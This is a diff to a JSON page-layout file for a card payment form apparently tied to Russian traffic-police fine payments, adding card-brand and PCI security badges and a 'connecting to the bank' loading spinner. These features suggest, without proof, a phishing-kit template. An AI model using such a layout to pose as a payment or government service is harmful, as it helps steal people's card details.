@@ -2,7 +2,8 @@
   "name": "rfi_gibdd",
   "cssFiles": [
     "css/reset.css",
-    "css/style.min.css"
+    "css/style.css",
+    "css/loader.css"
   ],
   "jsFiles": [
     "js/mask.min.js",
@@ -47,7 +48,26 @@
         "const-card-cvc"
       ]
     ],
-    "const-submit-btn"
+    "el.clear",
+    "const-submit-btn",
+    [
+      "markers.markers clear",
+      "marker.mc",
+      "marker.visa",
+      "marker.pci-dcc",
+      "marker.thawte"
+    ],
+    [
+      "loader.loader form-loader hidden",
+      [
+        "loader-wrap.lds-css ng-scope",
+        [
+          "loader-wrap2.lds-eclipse",
+          "const-rotation-el"
+        ],
+        "const-rotation-el-label"
+      ]
+    ]
   ],
   "payTransferLayout": [
     "page",
@@ -78,6 +98,7 @@
     "const-card-pan": "<span class='input_box'><input id='card_num' name='PayForm[card]' tabindex='1' class='input__control' placeholder='Номер карты' maxlength='24' autocomplete='false' type='tel'></span>",
     "const-card-valid": "<label class=''>VALID THRU</label><span class='input_box'><input name='PayForm[exp_month]' id='card_mm' class='input__control' tabindex='2' placeholder='MM' maxlength='2' autocomplete='false' type='tel'></span><label class='divider'>/</label><span class='input_box'><input name='PayForm[exp_year]' id='card_yy' class='input__control' tabindex='3' placeholder='ГГ' maxlength='2' autocomplete='false' type='tel'></span>",
     "const-card-cvc": "<span class='input_box'><input name='PayForm[cvc2]' id='card_cvc' class='input__control' tabindex='4' placeholder='CVC' maxlength='3' autocomplete='false' type='tel'></span><label class=''>Три цифры на обороте карты</label>",
-    "const-submit-btn": "<button id='submit_btn' type='button' tabindex='5' class='submit'>Далее</button>"
+    "const-submit-btn": "<button id='submit_btn' type='button' tabindex='5' class='submit'>Далее</button>",
+    "const-rotation-el-label": "<h4 align='center'>Установка соединения с банком</h4>"
   }
 }
